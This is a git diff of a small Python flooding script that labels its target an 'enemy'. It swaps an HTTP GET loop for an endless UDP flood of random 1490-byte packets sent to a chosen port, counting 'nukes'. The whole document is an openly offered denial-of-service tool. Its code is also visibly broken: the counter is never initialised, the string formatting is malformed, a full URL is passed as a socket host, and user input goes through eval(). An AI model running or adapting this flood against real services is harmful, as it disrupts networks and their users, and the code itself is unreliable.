@@ -1,9 +1,20 @@
 import requests
+import os
+import socket
+import random 
 print("Write your enemy (with http:// or https://)")
 gonnacooked = input()
+print("which port do you want to explode")
+whichport =eval(input())
+print("How much nukes need to send ")
+amountofnukes =eval(input())
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
 while  True:
-    ddos = requests.get(gonnacooked)
-    if ddos.status_code: 400 or 500
-print("bro got absoloutley cooked")
-if ddos.staus_code: 403
-print ("oh shit were caught on 4K")
+    sock.sendto(bytes ,(gonnacooked, whichport))
+    nukes = nukes +1
+    print ("nuked %s times to %s trought little port:%s "(nukes,gonnacooked,whichport ) )
+if nukes > amountofnukes:
+    print("Done!")
+    input("ress Enter to exit")
